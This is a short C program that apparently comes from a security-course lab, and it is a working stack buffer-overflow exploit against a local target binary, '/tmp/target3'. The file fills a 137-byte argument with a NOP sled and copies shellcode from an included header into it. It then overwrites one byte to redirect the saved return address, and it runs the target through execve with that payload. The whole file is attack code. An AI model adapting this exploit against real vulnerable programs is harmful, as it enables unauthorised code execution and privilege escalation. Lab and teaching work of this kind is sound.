#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define SIZE 137
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[SIZE]; // 1 for NULL

  memset(buffer, NOP, SIZE);

/*
 * There is no ebp, thus we just want to change the
 * return address, which is pushed on the stack, so
 * that it points to one of the arguments, which contains
 * our shellcode.
 */

  buffer[SIZE - 1] = 0x6c;
  
  // Add the shellcode
  int i = SIZE - 5 - strlen(shellcode);
  memcpy(buffer + i, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}                        
